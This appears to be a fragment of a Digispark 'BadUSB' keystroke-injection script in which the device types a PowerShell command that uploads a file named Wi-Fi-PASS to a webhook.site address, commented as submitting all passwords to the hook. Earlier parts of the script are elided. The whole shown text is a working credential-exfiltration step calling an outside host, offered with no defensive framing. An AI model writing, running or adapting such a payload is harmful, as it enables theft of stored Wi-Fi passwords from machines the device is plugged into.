...
void loop() {
  ...
  DigiKeyboard.delay(500);
  DigiKeyboard.println("powershell Invoke-WebRequest -Uri https://webhook.site/edcf7bc2-4912-4224-9094-b9f04370cacc -Method POST -InFile Wi-Fi-PASS"); //Submitting all passwords on hook
